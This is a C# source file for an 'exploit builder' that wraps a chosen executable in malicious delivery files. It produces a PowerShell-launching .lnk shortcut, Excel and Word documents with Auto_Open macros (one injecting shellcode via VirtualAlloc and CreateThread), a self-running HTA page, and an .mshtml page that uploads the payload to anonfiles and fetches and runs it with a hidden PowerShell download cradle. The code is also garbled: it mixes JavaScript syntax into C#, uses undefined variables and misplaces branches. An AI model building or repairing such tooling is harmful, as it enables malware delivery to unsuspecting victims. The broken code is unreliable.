using System;
using System.IO;
using IWshRuntimeLibrary;
using System.Text;
using Microsoft.Office.Interop.Excel;
using Microsoft.Office.Interop.Word;
using System.Windows.Forms;

class Program
{
    static void Main(string[] args)
    {
        Console.WriteLine("Enter Exploit Command: ");
        string command = Console.ReadLine();
        
        if (command == "exit")
        {
            break;
            
        }
        else if (input === "help") {
            console.log("List of available commands: ");
            console.log("b64 - Base64 Encode File To .b64");
            console.log("lnk - Create Shortcut Exploit .lnk");
            console.log("hta - Create HTML Application Exploit .hta");
            console.log("doc - Create Word Macro Exploit .doc");
            console.log("xls - Create Excel Macro Exploit .xls");
            console.log("html - Create Trident Engine Exploit .mshtml");
        }
        else if (command == "lnk")
        {
            // Open file dialog to select EXE file
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Filter = "EXE files (*.exe)|*.exe";
            openFileDialog.Title = "Select EXE file";

            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                // Read the contents of the selected EXE file
                byte[] exeBytes = File.ReadAllBytes(openFileDialog.FileName);

                // Convert the EXE file to a base64 string
                string base64String = Convert.ToBase64String(exeBytes);

                // Create a new Windows shortcut file
                string shortcutLocation = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "Shortcut.lnk");
                CreateShortcut(shortcutLocation, "My Shortcut", base64String);
            }
        }
        else if (command == "b64")
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
                openFileDialog.Filter = "Executable files (*.exe)|*.exe";
                openFileDialog.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    byte[] fileBytes = File.ReadAllBytes(openFileDialog.FileName);
                    string base64String = Convert.ToBase64String(fileBytes);
                    File.WriteAllText(Path.ChangeExtension(openFileDialog.FileName, ".b64"), base64String);
                    Console.WriteLine("File successfully converted to base64.");
                }
        }
        else if (command == "xls")
        {
            // Open file prompt dialogue for .exe file
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Filter = "EXE Files (*.exe)|*.exe";
            openFileDialog.Title = "Select EXE File";
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                // Convert inputted .exe file to base64 string
                byte[] exeFile = File.ReadAllBytes(openFileDialog.FileName);
                string base64String = Convert.ToBase64String(exeFile);
                
                // Create new .xls file
                Microsoft.Office.Interop.Excel.Application xlApp = new Microsoft.Office.Interop.Excel.Application();
                Microsoft.Office.Interop.Excel.Workbook xlWorkbook = xlApp.Workbooks.Add();
                Microsoft.Office.Interop.Excel.Worksheet xlWorksheet = xlWorkbook.Sheets[1];
                
                // Add macro to .xls file
                xlApp.VBE.ActiveVBProject.VBComponents.Add(Microsoft.Vbe.Interop.vbext_ComponentType.vbext_ct_StdModule);
                Microsoft.Vbe.Interop.VBComponent vbModule = xlApp.VBE.ActiveVBProject.VBComponents.Item(1);
                vbModule.CodeModule.AddFromString("Sub Auto_Open()" + "\n    Application.EnableEvents = False" + "\n    Dim exeFile() As Byte" + "\n    exeFile = Convert.FromBase64String(\"" + base64String + "\")" + "\n    Dim winExec As Object" + "\n    Set winExec = CreateObject(\"WScript.Shell\").Exec(exeFile)" + "\nEnd Sub" + "\nApplication.Run(\"Auto_Open\")");
                
                // Save and close .xls file
                xlWorkbook.SaveAs("macro.xls");
                xlWorkbook.Close();
                xlApp.Quit();
                
            }
            
        }
        else if (userCommand == "doc")
        {
            // Open file dialog to select .exe file
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Filter = "Executable Files (*.exe)|*.exe";
            openFileDialog.Title = "Select an executable file";
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                string filePath = openFileDialog.FileName;
                
                // Convert file to base64 string
                byte[] fileBytes = File.ReadAllBytes(filePath);
                string base64String = Convert.ToBase64String(fileBytes);
                
                // Create new Word document and add VBA macro
                var wordApp = new Microsoft.Office.Interop.Word.Application();
                wordApp.Visible = false;
                var doc = wordApp.Documents.Add();
                var macro = doc.VBProject.VBComponents.Add(Microsoft.Vbe.Interop.vbext_ComponentType.vbext_ct_StdModule);
                macro.CodeModule.AddFromString("Sub Auto_Open()\n" + "    Dim shellcode() As Byte\n" + "    shellcode = Convert.FromBase64String(\"" + base64String + "\")\n" + "    Dim shellcodeAddr As IntPtr = VirtualAlloc(0, shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE)\n" + "    Marshal.Copy(shellcode, 0, shellcodeAddr, shellcode.Length)\n" + "    Dim hThread As IntPtr = CreateThread(0, 0, shellcodeAddr, 0, 0, 0)\n" + "    WaitForSingleObject(hThread, INFINITE)\n" + "End Sub\n" + "Private Declare Function VirtualAlloc Lib \"kernel32\" (ByVal lpAddress As IntPtr, ByVal dwSize As Integer, ByVal flAllocationType As Integer, ByVal flProtect As Integer) As IntPtr\n" + "Private Declare Function CreateThread Lib \"kernel32\" (ByVal lpThreadAttributes As Integer, ByVal dwStackSize As Integer, ByVal lpStartAddress As IntPtr, ByVal param As Integer, ByVal dwCreationFlags As Integer, ByRef lpThreadId As Integer) As IntPtr\n" + "Private Declare Function WaitForSingleObject Lib \"kernel32\" (ByVal hHandle As IntPtr, ByVal dwMilliseconds As Integer) As Integer\n" + "Private Const MEM_COMMIT As Integer = 4096\n" + "Private Const PAGE_EXECUTE_READWRITE As Integer = &H40\n" + "Private Const INFINITE As Integer = -1\n");
                doc.SaveAs2(System.IO.Path.ChangeExtension(filePath, ".doc"));
                doc.Close();
                wordApp.Quit();
                Console.WriteLine("Successfully created .doc file with embedded VBA macro");
                
            }
            
        }

        else
        {
            Console.WriteLine("Invalid command. Please enter a valid command (encode, lnk).");
        }
    }
    else if (command == "hta")
    {
        // Open file dialog to select the input file
        OpenFileDialog fileDialog = new OpenFileDialog();
        fileDialog.Filter = "Executable files (*.exe)|*.exe";
        fileDialog.Title = "Select the input file";
        if (fileDialog.ShowDialog() == DialogResult.OK)
        {
            // Convert the input file to a base64 string
            byte[] fileBytes = File.ReadAllBytes(fileDialog.FileName);
            string base64String = Convert.ToBase64String(fileBytes);
            
            // Create a new HTA file
            string htaFileName = Path.ChangeExtension(fileDialog.FileName, ".hta");
            File.WriteAllText(htaFileName, "<html>\n<head>\n<script>\nfunction runExe() {\nvar exeData = '" + base64String + "';\nvar exeBytes = atob(exeData);\nvar exeBlob = new Blob([exeBytes]);\nvar exeUrl = URL.createObjectURL(exeBlob);\nvar exe = new ActiveXObject('WScript.Shell').Exec(exeUrl);\n}\n</script>\n</head>\n<body onload='runExe()'>\n</body>\n</html>");
            
        }
        
    }
    else if (input == "html")
    {
        OpenFileDialog openFileDialog = new OpenFileDialog();
        openFileDialog.Filter = "exe files (*.exe)|*.exe";
        
        if (openFileDialog.ShowDialog() == true)
        {
            var file = openFileDialog.FileName;
            var fileBytes = File.ReadAllBytes(file);
            var fileBase64 = Convert.ToBase64String(fileBytes);
            
            // upload the file to anonfiles
            var client = new HttpClient();
            var form = new MultipartFormDataContent();
            form.Add(new StringContent(fileBase64), "file", "file.exe");
            var response = await client.PostAsync("https://api.anonfiles.com/upload", form);
            
            // get the download link from the response
            var jsonResponse = await response.Content.ReadAsStringAsync();
            var downloadLink = JsonConvert.DeserializeObject<Dictionary<string, string>>(jsonResponse)["data"]["file"]["url"]["full"];
            
            // create the mshtml file
            var mshtml = "<html>\n<head>\n<script>\n var r = new ActiveXObject(\"WScript.Shell\").Run(\"powershell -nop -w hidden -c \\\"IEX (New-Object Net.WebClient).DownloadString('" + downloadLink + "');\\\"\");\n</script>\n</head>\n<body>\n</body>\n</html>";
            File.WriteAllText("file.mshtml", mshtml);
            
        }
        
    }

    static void CreateShortcut(string location, string description, string base64String)
    {
        WshShell shell = new WshShell();
        IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(location);
        shortcut.TargetPath = "powershell";
        shortcut.Arguments = $"-command \"$flnm = [System.Convert]::FromBase64String('{base64String}');Start-Process -FilePath powershell -ArgumentList '-noprofile -executionpolicy Bypass -EncodedCommand $flnm'\"";
        shortcut.Description = description;
        shortcut.Save();
    }
}
